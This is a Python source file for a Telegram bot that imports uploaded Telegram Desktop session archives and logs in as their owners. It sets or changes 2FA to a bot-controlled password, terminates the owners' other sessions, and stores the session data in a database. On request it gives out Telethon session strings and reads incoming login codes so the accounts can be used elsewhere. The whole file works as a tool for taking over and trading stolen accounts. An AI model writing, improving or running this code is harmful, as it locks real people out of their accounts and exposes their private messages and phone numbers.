# Exceptions & Config
from pyromod.exceptions import ListenerTimeout
from config import Txt, Config
from functools import wraps
# Standard Library
import os
import re
import io
import base64
import zipfile
import rarfile
import shutil
import tempfile
import hashlib
import traceback
import asyncio
from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor

# Pyrogram
from pyrogram import Client, filters
from pyrogram import Client as PyroClient
from pyrogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
)
from pyrogram.session import Session
from pyrogram.storage.memory_storage import MemoryStorage
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    PhoneNumberInvalid,
    FloodWait,
)

# Telethon
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PasswordHashInvalidError,
)
from telethon.errors.rpcerrorlist import PhoneNumberBannedError
from telethon.tl.functions.account import GetPasswordRequest
# OpenTele
from opentele.td import TDesktop
from opentele.api import UseCurrentSession
# Database
import motor.motor_asyncio
from datetime import datetime, timezone, timedelta
from pyrogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneNumberBannedError,
    PasswordHashInvalidError
)


API_ID = Config.API_ID
API_HASH = Config.API_HASH
ADMINS = Config.ADMIN
USERPASS = Config.USERPASS
MAINPASS = Config.MAINPASS
CODE_RE = re.compile(r"(\d{5,6})")

def require_verified(func):
    @wraps(func)
    async def wrapper(client, message: Message, *args, **kwargs):
        user_id = message.from_user.id
        if await db.is_verified(user_id) or user_id in ADMINS:
            return await func(client, message, *args, **kwargs)
        else:
            # ɴᴏᴛɪꜰʏ ᴀᴅᴍɪɴꜱ
            for admin_id in ADMINS:
                await client.send_message(
                    admin_id,
                    f"🚨 Uɴᴠᴇʀɪꜰɪᴇᴅ ᴜꜱᴇʀ ᴛʀɪᴇᴅ ᴛᴏ ᴀᴄᴄᴇꜱꜱ:\n"
                    f"👤 {user_id} (@{message.from_user.username})\n\n"
                    f"✅ Tᴏ ᴠᴇʀɪꜰʏ:\n<code>/verify {user_id}</code>"
                )
            return await message.reply(
                "⛔ Yᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴠᴇʀɪꜰɪᴇᴅ ʏᴇᴛ.\n"
                "⏳ Pʟᴇᴀꜱᴇ ᴡᴀɪᴛ ꜰᴏʀ ᴀᴅᴍɪɴ ᴀᴘᴘʀᴏᴠᴀʟ."
            )
    return wrapper

    
async def check_2fa(client):
    try:
        pw = await client(GetPasswordRequest())
        if pw.has_password:   # True if 2FA is enabled
            return "2FA: Enabled"
        else:
            return "2FA: Disabled"
    except PasswordHashInvalidError:
        return "2FA: Disabled"
    except Exception as e:
        return f"2FA: Unknown ({e})"

from telethon.errors import PasswordHashInvalidError

from telethon.tl.functions.account import UpdatePasswordSettingsRequest, GetPasswordRequest
from telethon.tl.types import account
from telethon.errors import PasswordHashInvalidError

from telethon.errors import PasswordHashInvalidError

async def add_2fa(client, new_password: str, message):
    try:
        # Try setting 2FA directly (only works if account has no existing 2FA)
        success = await client.edit_2fa(
            current_password=None,        # no current password, since we assume 2FA not set
            new_password=new_password,    # the password to set
            hint="Set via bot",           # optional hint
            email=None                    # optional recovery email
        )

        if success:
            return True, f"2FA Sᴇᴛ ᴛᴏ : {new_password}"
        else:
            return False, "❌ Fᴀɪʟᴇᴅ ᴛᴏ sᴇᴛ 2FA (ᴜɴᴋɴᴏᴡɴ ʀᴇᴀsᴏɴ)"

    except PasswordHashInvalidError:
        return False, "❌ Wʀᴏɴɢ ᴄᴜʀʀᴇɴᴛ ᴘᴀssᴡᴏʀᴅ (2FA ᴀʟʀᴇᴀᴅʏ sᴇᴛ)"
    except Exception as e:
        return False, f"❌ Eʀʀᴏʀ ɪɴ 2FA ᴀᴅᴅɪɴɢ: {e}"

async def set_or_change_2fa(tele_client, new_password: str, old_password: str = None):
    try:
        success = await tele_client.edit_2fa(
            current_password=old_password,   # None if first time, else provide old
            new_password=new_password,       # new 2FA password
            hint="Set via bot"
        )
        if success:
            return True, f"✅ 2FA updated to: `{new_password}`"
        else:
            return False, "❌ Failed to update 2FA."
    except PasswordHashInvalidError:
        return False, "❌ Wrong old password, could not change 2FA."
    except Exception as e:
        return False, f"❌ Error in 2FA update: {e}"


async def show_rar(tdata_path: str, message: Message, num):
    tmp_dir = tempfile.mkdtemp()
    rar_path = os.path.join(tmp_dir, f"tdata{num}.rar")
    shutil.make_archive(rar_path.replace(".rar", ""), "zip", tdata_path)
    os.rename(rar_path.replace(".rar", ".zip"), rar_path)  # fake rar extension

    await message.reply_document(rar_path, caption=f"📦 {num} TDATA as RAR")
    shutil.rmtree(tmp_dir, ignore_errors=True)
    
async def show_tdata_structure(tdata_path: str, message: Message, num):
    structure = []
    for root, dirs, files in os.walk(tdata_path):
        level = root.replace(tdata_path, "").count(os.sep)
        indent = "   " * level
        structure.append(f"{indent}📂 {os.path.basename(root)}/")
        for f in files:
            structure.append(f"{indent}   └── {f}")

    preview = "\n".join(structure[:50])  # first 50 lines
    if len(structure) > 100:
        preview += f"\n... ({len(structure)-50} more entries)"

    await message.reply(
        f"📂 TDATA structure at:\n`{tdata_path}`\n```\n{preview}\n```",
        quote=True
    )

async def show_zip_structure(zip_path, message, client):
    try:
        with zipfile.ZipFile(zip_path, "r") as zf:
            files = zf.namelist()

        # Build full tree
        structure = []
        for f in files:
            parts = f.strip("/").split("/")
            indent = "   " * (len(parts) - 1)
            structure.append(f"{indent}└── {parts[-1]}")

        txt_path = os.path.join(tempfile.gettempdir(), "zip_structure.txt")
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("\n".join(structure))

        
        await client.send_document(
            chat_id=message.chat.id,
            document=txt_path,
            caption="📂 Full zip structure",
            reply_to_message_id=message.id
        )

        os.remove(txt_path)

    except Exception as e:
        await message.reply(f"⚠️ Failed to read zip structure: {e}")




from telethon.tl.functions.auth import ResetAuthorizationsRequest

async def terminate_all_other_sessions(client):
    try:
        await client(ResetAuthorizationsRequest())
        return "✅ All other sessions terminated (except this one)."
    except Exception as e:
        return f"❌ Failed to terminate sessions: {e}"



class Database:
    def __init__(self, uri, database_name):
        self._client = motor.motor_asyncio.AsyncIOMotorClient(uri)
        self.db = self._client[database_name]
        self.col = self.db.used   # main accounts
        self.syd = self.db.syd
        self.users = self.db.users # ownership mapping
        self.verified = self.db.verified_users


    async def add_user(self, user_id: int):
        await self.users.update_one({ "_id": user_id }, { "$set": {} }, upsert=True)

    async def get_all_users(self):
        return self.users.find({})

    async def total_users_count(self):
        return await self.users.count_documents({})
    
    async def delete_user(self, user_id: int):
        await self.users.delete_one({"_id": user_id})

    async def is_verified(self, user_id: int):
        has_account = await self.syd.find_one({"user_id": user_id})
        if has_account:
            return True
       
        verified = await self.verified.find_one({"_id": user_id})
        return bool(verified)

    async def add_verified(self, user_id: int):
        await self.verified.update_one({"_id": user_id}, {"$set": {"verified": True}}, upsert=True)

    async def revoke_verified(self, user_id: int):
        await self.verified.delete_one({"_id": user_id})

    async def get_user_account_info(self, user_id: int):
        doc = await self.syd.find_one({"_id": user_id})
        if not doc or "accounts" not in doc:
            return []

        acc_nums = doc["accounts"]

        cursor = self.col.find({"account_num": {"$in": acc_nums}})
        return [acc async for acc in cursor]

    async def reset_field(self, user_id, field: str, value="?"):
        await self.col.update_one(
            {"_id": user_id},
            {"$set": {field: value}}
        )
  

    async def grant_account(self, user_id: int, acc_num: int):
        acc = await self.col.find_one({"account_num": acc_num})
        if not acc:
            return False, f"❌ Account #{acc_num} does not exist."

        await self.syd.update_one(
            {"_id": user_id},
            {"$addToSet": {"accounts": acc_num}},  # prevent duplicate entries
            upsert=True,
        )
        return True, f"✅ Granted account #{acc_num} to user {user_id}"

    async def list_user_accounts(self, user_id: int):
        """List granted accounts for a user"""
        doc = await self.syd.find_one({"_id": user_id})
        return doc.get("accounts", []) if doc else []

    async def get_next_account_num(self):
        """Return next unique account number"""
        last = await self.col.find_one(sort=[("account_num", -1)])
        if not last:
            return 1
        return last["account_num"] + 1

    async def save_account(self, user_id, info, tdata_bytes):
        existing = await self.col.find_one({"_id": user_id})
        if existing:
            account_num = existing["account_num"]
        else:
            if info.get("phone"):
                phone_match = await self.col.find_one({"phone": info["phone"]})
                if phone_match:
                    account_num = phone_match["account_num"]
                    user_id = phone_match["_id"]
                else:
                    account_num = await self.get_next_account_num()
            else:
                account_num = await self.get_next_account_num()

        doc = {
            "_id": user_id,
            "account_num": account_num,
            "name": info.get("name", "?"),
            "phone": info.get("phone", "?"),
            "twofa": info.get("twofa", "?"),
            "spam": info.get("spam", "?"),
            "by": info.get("by", "?"),
            "tdata": base64.b64encode(tdata_bytes).decode("utf-8"),
        }
        await self.col.update_one({"_id": user_id}, {"$set": doc}, upsert=True)
        return account_num

    async def total_users_count(self):
        return await self.col.count_documents({})
    
    async def list_accounts(self):
        """Return all accounts"""
        cursor = self.col.find({}, {"_id": 0, "account_num": 1, "name": 1, "phone": 1, "by": 1})
        return [doc async for doc in cursor]


db = Database(Config.DB_URL, Config.DB_NAME)

  
@Client.on_message(filters.document)
@require_verified
async def handle_archive(client, message):
    try:
        buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("Sᴇᴄᴜʀᴇ ✅", callback_data="secure_true"),
                    InlineKeyboardButton("Dᴏɴᴛ Sᴇᴄᴜʀᴇ ❌", callback_data="secure_false")
                ]
            ]
        )
        ask_msg = await message.reply(
            "⚠️ Pʟᴇᴀꜱᴇ ꜱᴇʟᴇᴄᴛ ɪꜰ ᴛʜᴇ ᴀʀᴄʜɪᴠᴇ ᴡᴀɴᴛ ᴛᴏ ᴠᴇ ꜱᴇᴄᴜʀᴇᴅ ᴏʀ ɴᴏᴛ. \nIꜰ ꜱᴇᴄᴜʀᴇ ᴀʟʟ ᴛʜᴇ ᴏᴛʜᴇʀ ꜱᴇꜱꜱɪᴏɴꜱ ᴡɪʟʟ ʙᴇ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀɴᴅ ɪꜰ 2FA ᴅᴏᴇꜱɴ'ᴛ ᴇxɪꜱᴛ ɪᴛ ᴡɪʟʟ ʙᴇ ꜱᴇᴛ.",
            reply_markup=buttons,
            quote=True
        )
    except:
        pass
        
@Client.on_callback_query(filters.regex(r"^secure"))
async def handle_guide_cb(client, cb):
    tempdir = tempfile.mkdtemp()
    results = []
    try:
        ask_msg = cb.message
        value = cb.data.split("_")[-1]
        secure = False
        message = ask_msg.reply_to_message  # None if not a reply
        if value == "false":
            await cb.answer("ᴅᴏɴᴛ ꜱᴇᴄᴜʀɪɴɢ....", show_alert=True)
            secure = False
        else:
            await cb.answer("ꜱᴇᴄᴜʀɪɴɢ....", show_alert=True)
            secure = True
        await ask_msg.delete()

        sy = await message.reply("• Sᴛᴇᴘ 1: Dᴏᴡɴʟᴏᴀᴅɪɴɢ ꜰɪʟᴇ...", quote=True)
        try:
            file_path = await message.download(file_name=os.path.join(tempdir, message.document.file_name))
            await sy.edit(f"• Sᴛᴇᴘ 1.2: Fɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴛᴏ `{file_path}`")
        except Exception as e:
            return await sy.edit(f"• Sᴛᴇᴘ 1 (Dᴏᴡɴʟᴏᴀᴅ) ꜰᴀɪʟᴇᴅ: {e}")

        extract_dir = os.path.join(tempdir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        await sy.edit(f"• Sᴛᴇᴘ 1.2: Fɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴛᴏ {file_path}")
    #    await show_zip_structure(file_path, message, client)

        await sy.edit("• Sᴛᴇᴘ 2.1: Tʀʏɪɴɢ ᴛᴏ ᴇxᴛʀᴀᴄᴛ ᴀʀᴄʜɪᴠᴇ...")
        try:
            with zipfile.ZipFile(file_path, "r") as zip_ref:
                zip_ref.extractall(extract_dir)
            await sy.edit(f"• Sᴛᴇᴘ 2.2: Zɪᴘ ᴇxᴛʀᴀᴄᴛᴇᴅ ᴛᴏ `{extract_dir}`")
        except Exception as e_zip:
            try:
                with rarfile.RarFile(file_path, "r") as rar_ref:
                    rar_ref.extractall(extract_dir)
                await sy.edit(f"• Sᴛᴇᴘ 2.3: Rᴀʀ ᴇxᴛʀᴀᴄᴛᴇᴅ ᴛᴏ `{extract_dir}`")
            except Exception as e_rar:
                return await message.reply(
                    f"• Sᴛᴇᴘ 2 (Exᴛʀᴀᴄᴛɪᴏɴ) ꜰᴀɪʟᴇᴅ.\n"
                    f"Zɪᴘ ᴇʀʀᴏʀ: {e_zip}\nRᴀʀ ᴇʀʀᴏʀ: {e_rar}"
                )

        await sy.edit("• Sᴛᴇᴘ 3: Sᴇᴀʀᴄʜɪɴɢ / ʙᴜɪʟᴅɪɴɢ `ᴛᴅᴀᴛᴀ`...")

        tdata_paths = []

        for root, dirs, files in os.walk(extract_dir):
            has_d877 = any(d.startswith("D877F") for d in dirs)
            has_keys = any(f in ("key_data", "key_1", "key_datas") for f in files) or \
                       any(d in ("key_data", "key_1", "key_datas") for d in dirs)

            if has_d877 and has_keys:
                tdata_paths.append(root)
                await sy.edit(f"• Fᴏᴜɴᴅ ᴠᴀʟɪᴅ ᴛᴅᴀᴛᴀ ꜰᴏʟᴅᴇʀ: {root}")

            elif has_d877:
                fake_tdata = os.path.join(root, "tdata")
                os.makedirs(fake_tdata, exist_ok=True)
                for item in os.listdir(root):
                    if item.startswith("D877F") or item in ("key_data", "key_1", "key_datas", "key"):
                        shutil.move(os.path.join(root, item),
                                    os.path.join(fake_tdata, item))
                tdata_paths.append(fake_tdata)
                await sy.edit(f"• Bᴜɪʟᴛ ꜰᴀᴋᴇ ᴛᴅᴀᴛᴀ ᴀᴛ: {fake_tdata}")

            for f in files:
                if f.lower().endswith(".rar"):
                    rar_path = os.path.join(root, f)
                    await sy.edit(f"• Fᴏᴜɴᴅ ɪɴɴᴇʀ Rᴀʀ: {rar_path}")
                    try:
                        rar_extract_dir = os.path.join(root, "rar_extracted")
                        os.makedirs(rar_extract_dir, exist_ok=True)
                        with rarfile.RarFile(rar_path, "r") as rf:
                            rf.extractall(rar_extract_dir)
                        for r2, d2, f2 in os.walk(rar_extract_dir):
                            has_d877_rar = any(d.startswith("D877F") for d in d2)
                            has_keys_rar = any(x in ("key_data", "key_1") for x in f2 + d2)
                            if has_d877_rar and has_keys_rar:
                                tdata_paths.append(r2)
                                await message.reply(f"• Exᴛʀᴀᴄᴛᴇᴅ ɪɴɴᴇʀ Rᴀʀ ᴛᴅᴀᴛᴀ: {r2}")
                    except Exception as e:
                        await message.reply(f"⚠️ Fᴀɪʟᴇᴅ ᴛᴏ ᴇxᴛʀᴀᴄᴛ ɪɴɴᴇʀ Rᴀʀ: {e}")
                        fake_tdata = os.path.join(root, "tdata")
                        os.makedirs(fake_tdata, exist_ok=True)
                        shutil.copy(rar_path, os.path.join(fake_tdata, os.path.basename(rar_path)))
                        tdata_paths.append(fake_tdata)
                        await message.reply(f"🔧 Wʀᴀᴘᴘᴇᴅ ɪɴɴᴇʀ Rᴀʀ ᴀs ꜰᴀᴋᴇ ᴛᴅᴀᴛᴀ ᴀᴛ: {fake_tdata}")

        if not tdata_paths:
            return await sy.edit("⚠️ Nᴏ `ᴛᴅᴀᴛᴀ` ꜰᴏʟᴅᴇʀs ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ᴛʜɪs ᴀʀᴄʜɪᴠᴇ.")

        start_num = await db.get_next_account_num()
        for offset, tdata_path in enumerate(tdata_paths, 1):
            
            await sy.edit(f"• Sᴛᴇᴘ 4.{offset}: Pʀᴏᴄᴇssɪɴɢ ᴛᴅᴀᴛᴀ ᴀᴛ `{tdata_path}`")
            try:
                await asyncio.sleep(10)
                await show_tdata_structure(tdata_path, message, offset)
                tdesk = TDesktop(tdata_path)
                if not tdesk.isLoaded():
                    results.append(f"#{offset} ⚠️ Fᴀɪʟᴇᴅ ᴛᴏ ʟᴏᴀᴅ (ᴄᴏʀʀᴜᴘᴛᴇᴅ ᴛᴅᴀᴛᴀ)")
                    continue
                await sy.edit(f"• Lᴏᴀᴅᴇᴅ ᴛᴅᴀᴛᴀ #{offset}")

                tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
                await tele_client.connect()
                await sy.edit(f"• Cᴏɴɴᴇᴄᴛᴇᴅ Tᴇʟᴇᴛʜᴏɴ ᴄʟɪᴇɴᴛ ꜰᴏʀ ᴛᴅᴀᴛᴀ #{offset}")

                if not await tele_client.is_user_authorized():
                    results.append(f"#{offset} ⚠️ Nᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ (ɴᴇᴇᴅs ʟᴏɢɪɴ / 2FA)")
                    await message.reply(f"⚠️ ᴛᴅᴀᴛᴀ #{offset} ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ")
                    continue
                me = await tele_client.get_me()
                await sy.edit(f"• Lᴏɢɢᴇᴅ ɪɴ ᴀs {me.first_name or '?'} ({me.id})")
                syd = await check_2fa(tele_client)
                clean_zip_path = os.path.join(tempfile.gettempdir(), f"{me.id}_tdata.zip")
                with zipfile.ZipFile(clean_zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                    for root, dirs, files in os.walk(tdata_path):
                        for file in files:
                            full_path = os.path.join(root, file)
                            arcname = os.path.relpath(full_path, tdata_path)
                            zipf.write(full_path, arcname)

                with open(clean_zip_path, "rb") as f:
                    tdata_bytes = f.read()
                if secure:
                    if message.from_user.id in ADMINS:
                        passs = MAINPASS
                    else:
                        passs = USERPASS
                    sd, mrsyd = await set_or_change_2fa(tele_client, passs)
                    nsyd = f"{mrsyd} \n " + await terminate_all_other_sessions(tele_client)
                    syd = f"2FA : {passs}"
                else:
                    nsyd = ""
       
                info = {
                    "name": me.first_name or "?",
                    "phone": me.phone or "?",
                    "twofa": syd,
                    "spam": getattr(me, "restricted", False),
                    "by":  f"{message.from_user.first_name}({message.from_user.id})",
                }
                sydno = await db.save_account(me.id, info, tdata_bytes)
                await show_rar(tdata_path, message, sydno)
                
                await message.reply(f"Lᴏɢɢᴇᴅ ɪɴ ᴀs {me.first_name or '?'} ({me.id}) \n ID: {sydno} \n PH: +{me.phone} \n {syd} \n {nsyd}", quote=True)
                results.append(
                    f"#{sydno}\n"
                    f"Aᴄᴄᴏᴜɴᴛ Nᴀᴍᴇ: {info['name']}\n"
                    f"Pʜᴏɴᴇ Nᴜᴍʙᴇʀ: {info['phone']}\n"
                    f"{info['twofa']}\n"
                    f"Sᴘᴀᴍ Mᴜᴛᴇ: {info['spam']}\n"
                )

                await tele_client.disconnect()
                await sy.edit(f"Fɪɴɪsʜᴇᴅ ᴘʀᴏᴄᴇssɪɴɢ ᴀᴄᴄᴏᴜɴᴛ #{sydno} ✅")
                if message.from_user.id not in ADMINS:
                    await db.syd.update_one(
                    {"user_id": message.from_user.id},
                    {"$addToSet": {"accounts": sydno}},
                    upsert=True
                    )
            except SessionPasswordNeededError:
                results.append(f"#{offset} ❌ 2FA: Eɴᴀʙʟᴇᴅ (ᴘᴀssᴡᴏʀᴅ ʀᴇQᴜɪʀᴇᴅ)")
                await message.reply(f"❌ ᴛᴅᴀᴛᴀ #{offset}: Nᴇᴇᴅs 2FA ᴘᴀssᴡᴏʀᴅ")
            except PhoneNumberBannedError:
                results.append(f"#{offset} 🚫 Bᴀɴɴᴇᴅ ɴᴜᴍʙᴇʀ")
                await message.reply(f"🚫 ᴛᴅᴀᴛᴀ #{offset}: Bᴀɴɴᴇᴅ ᴀᴄᴄᴏᴜɴᴛ")
            except Exception as e:
                results.append(f"#{offset} ❌ Eʀʀᴏʀ: {str(e)}")
                await message.reply(f"❌ Eʀʀᴏʀ ɪɴ Sᴛᴇᴘ 4.{offset}: {e}")

        report_text = "📑 Fɪɴᴀʟ Rᴇᴘᴏʀᴛ:\n\n" + "\n".join(results)
        report_path = os.path.join(tempdir, "report.txt")
        with open(report_path, "w") as f:
            f.write(report_text)

        await message.reply_document(report_path, caption="Rᴇᴘᴏʀᴛ ɢᴇɴᴇʀᴀᴛᴇᴅ ✅", quote=True)

    except Exception as e:
        await message.reply(f"❌ ᴇʀʀᴏʀ: {e}")
    finally:
        shutil.rmtree(tempdir, ignore_errors=True)

async def check_valid_session(tdata_b64: str, message):
    temp_dir = tempfile.mkdtemp()
    tdata_zip = os.path.join(temp_dir, "tdata.zip")

    try:
        with open(tdata_zip, "wb") as f:
            f.write(base64.b64decode(tdata_b64))

        extract_dir = os.path.join(temp_dir, "tdata")
        with zipfile.ZipFile(tdata_zip, "r") as z:
            z.extractall(extract_dir)

        tdesk = TDesktop(extract_dir)
        if not tdesk.isLoaded():
            await message.reply("❌ Invalid TData structure (missing required files)")
            return False, None, None

        tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
        await tele_client.connect()

        if await tele_client.is_user_authorized():
            me = await tele_client.get_me()
            await message.reply(
                f"✅ Authorized as {me.first_name} (`{me.id}`)\nPhone: {'+' + me.phone or 'N/A'}"
            )
            return True, me, tele_client
        else:
            await message.reply("⚠️ Session loaded but not authorized (needs login / 2FA)")
            return False, None, None

    except Exception as e:
        await message.reply(f"❌ Exception: {e}")
        return False, None, None

    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)



@Client.on_message(filters.command("retrieve") & filters.private)
async def retrieve_account(client, message):
    user_id = message.from_user.id
    if len(message.command) < 2:
        return await message.reply("⚠️ Usage: `/retrieve account_number`", quote=True)

    try:
        acc_num = int(message.command[1])
    except ValueError:
        return await message.reply("❌ Invalid account number.")

    if user_id in ADMINS:
        doc = await db.col.find_one({"account_num": acc_num})
    else:
        # ✅ Non-admins → only allowed if they own this account
        doc = await db.syd.find_one({"_id": user_id, "account_num": acc_num})
        if doc:
            # load the account details from main collection
            doc = await db.col.find_one({"account_num": acc_num})

    if not doc:
        return await message.reply("❌ You don't have access to this account.")
    valid, me, session = await check_valid_session(doc["tdata"], message)
    status = "✅ Valid" if valid else "❌ Invalid"

    text = (
        f"📂 Account Info\n"
        f"Account #: {acc_num}\n"
        f"Name: {doc['name']}\n"
        f"Phone: {doc['phone']}\n"
        f"{doc['twofa']}\n"
     #   f"Spam: {doc['spam']}\n"
        f"Status: {status}"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📄 Sᴇꜱꜱɪᴏɴ Tᴇʟᴇ", callback_data=f"tele_{acc_num}")],
        [InlineKeyboardButton("📱 Bʏ Pʜᴏɴᴇ", callback_data=f"phone_{acc_num}")],
        [InlineKeyboardButton("Sᴇᴛ 2FA", callback_data=f"set2fa_{acc_num}"),
         InlineKeyboardButton("Rᴇᴍᴏᴠᴇ 2FA", callback_data=f"remove2fa_{acc_num}")]
    ])

    await message.reply(text, reply_markup=keyboard)




@Client.on_callback_query(filters.regex(r"^(tele|py|phone|set2fa|remove2fa)_(\d+)$"))
async def retrieve_options(client, callback_query):
    try:
        action, acc_num = callback_query.data.split("_")
        acc_num = int(acc_num)

        doc = await db.col.find_one({"account_num": acc_num})
        if not doc:
            return await callback_query.message.edit("❌ Account not found.")

        await callback_query.message.edit("⏳ Loading session from TData...")

        valid, me, session = await check_valid_session(
            doc["tdata"], callback_query.message
        )
        
        tele_client = session
        if not valid:
            return await callback_query.message.edit(
                "❌ Could not load session from TData."
            )
        if action == "tele":
            await callback_query.message.edit("⚙️ Generating Telethon session...")

            # use .session.save() or StringSession.save()
            tele_string = StringSession.save(session.session)

            await client.send_message(
                callback_query.from_user.id,
                f"🔑 **Telethon session** for **{me.first_name}** (`{me.id}`):\n\n`{tele_string}`"
            )
            return await callback_query.message.edit("✅ Telethon session sent via DM.")
        elif action == "phone":
            phone = doc.get("phone", "❌ Not saved")
            fa = doc.get("twofa", "❌ Not saved")
            return await callback_query.message.edit(
                f"📱 Phone number: `{phone}`\n{fa}\n\nClick **Get Code** after sending code to this number.",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("📩 Get Code", callback_data=f"getcode_{acc_num}")]]
                )
            )

        elif action == "set2fa":
            ask_msg = await callback_query.message.edit(
                "🔐 Send me the **new 2FA password** (or type `/cancel`)."
            )

            try:
                resp = await client.listen(callback_query.from_user.id, timeout=300)
            except Exception:
                return await ask_msg.edit("⏰ Timeout. No password received.")

            if not resp.text or resp.text.startswith("/cancel"):
                return await ask_msg.edit("❌ Cancelled.")

            new_pass = resp.text.strip()
            pw = await tele_client(functions.account.GetPasswordRequest())
            old_pass = None
            if pw.has_password:
                await client.send_message(
                    callback_query.from_user.id,
                    "🔑 This account already has 2FA. Send me the **old password**."
                )
                try:
                    resp_old = await client.listen(callback_query.from_user.id, timeout=300)
                    old_pass = resp_old.text.strip()
                except Exception:
                    return await callback_query.message.edit("⏰ Timeout waiting for old password.")

            # Try setting/changing 2FA
            status, msg = await set_or_change_2fa(tele_client, new_pass, old_pass)
            if status:
                await db.reset_field(acc_num, "twofa", f"2FA: {new_pass}")
            return await callback_query.message.edit(msg)

        elif action == "remove2fa":
            await callback_query.message.edit("🔑 Send me your **current 2FA password** to remove:")
            try:
                resp = await client.listen(callback_query.from_user.id, timeout=300)
                old_pass = resp.text.strip()
            except asyncio.TimeoutError:
                return await callback_query.message.edit("⏰ Timed out. Please try again.")

            try:
                success = await session.edit_2fa(
                    current_password=old_pass,
                    new_password=None   # 🚨 Remove 2FA
                )
                if success:
                    await callback_query.message.edit("✅ 2FA has been removed successfully.")
                    await db.reset_field(acc_num, "twofa", "2FA: Disabled")
                else:
                    await callback_query.message.edit("❌ Failed to remove 2FA.")
            except PasswordHashInvalidError:
                await callback_query.message.edit("❌ Wrong password. Could not remove 2FA.")
            except Exception as e:
                await callback_query.message.edit(f"❌ Error removing 2FA:\n`{e}`")

    except Exception as e:
        await callback_query.message.edit(
            f"❌ Unexpected error while generating session.\n\n`{e}`"
        )


IST = timezone(timedelta(hours=5, minutes=30))

@Client.on_callback_query(filters.regex(r"^getcode_(\d+)$"))
async def get_code(client, callback_query):
    acc_num = int(callback_query.data.split("_")[1])
    doc = await db.col.find_one({"account_num": acc_num})
    if not doc:
        return await callback_query.message.edit("❌ Account not found.")

    temp_dir = tempfile.mkdtemp()
    tdata_zip = os.path.join(temp_dir, "tdata.zip")
    with open(tdata_zip, "wb") as f:
        f.write(base64.b64decode(doc["tdata"]))

    extract_dir = os.path.join(temp_dir, "tdata")
    with zipfile.ZipFile(tdata_zip, "r") as zip_ref:
        zip_ref.extractall(extract_dir)

    try:
        tdesk = TDesktop(extract_dir)
        if not tdesk.isLoaded():
            return await callback_query.answer("⚠️ Failed to load (corrupted tdata)", show_alert=True)

        tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
        await tele_client.connect()

        if not await tele_client.is_user_authorized():
            return await callback_query.answer("⚠️ Not authorized (needs login / 2FA)", show_alert=True)

        msgs = await tele_client.get_messages(777000, limit=1)
        if not msgs:
            return await callback_query.answer("⚠️ No recent code messages found!", show_alert=True)

        msg = msgs[0]
        text = msg.message
        match = re.search(r"Login code[:\s]+(\d{5})", text)
        if match:
            code = match.group(1)

            # Convert UTC → IST
            sent_time = msg.date.astimezone(IST).strftime("%Y-%m-%d %H:%M:%S")

            await callback_query.answer(
                f"📩 Code: {code}\n🕒 Sent at (IST): {sent_time}",
                show_alert=True
            )
        else:
            await callback_query.answer("⚠️ Couldn’t find a login code in the last message.", show_alert=True)

    except Exception as e:
        await callback_query.answer(f"❌ Error: {str(e)}", show_alert=True)
    finally:
        shutil.rmtree(temp_dir)



@Client.on_message(filters.command("clean_db") & filters.private & filters.user(ADMINS))
async def clean_db(client, message):
    confirmation_text = (
        "⚠️ This will permanently delete ALL accounts in the database.\n"
        "Reply with `YES` to confirm."
    )
    await message.reply(confirmation_text)
    try:
        response = await client.listen(message.chat.id, timeout=30)
        if response.text.strip().upper() != "YES":
            return await message.reply("❌ Operation cancelled.")
    except Exception:
        return await message.reply("❌ Timeout. Operation cancelled.")

    result = await db.col.delete_many({})
    await message.reply(f"✅ Database cleaned. Deleted {result.deleted_count} accounts.")



@Client.on_message(filters.command("show_db") & filters.private & filters.user(ADMINS))
async def show_db(client, message):
    try:
        accounts = await db.list_accounts()
        if not accounts:
            return await message.reply("❌ No accounts in DB yet.")

        text = "📋 Stored Accounts:\n\n"
        for acc in accounts:
            text += f"• Account #: {acc.get('account_num', '-')}\n"
            text += f"  Name: {acc.get('name', '-')}\n"
            text += f"  Phone: {acc.get('phone', '-')}\n"
            text += f"  By: {acc.get('by', '-')}\n\n"

        if len(text) < 4000:  # safe limit
            await message.reply(text)
        else:
            tmp_path = None
            try:
                with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".txt") as tmp:
                    tmp.write(text)
                    tmp_path = tmp.name
                await message.reply_document(tmp_path, caption="📋 Stored Accounts")
            finally:
                if tmp_path and os.path.exists(tmp_path):
                    os.remove(tmp_path)

    except Exception as e:
        await message.reply(f"❌ An error occurred:\n{e}")
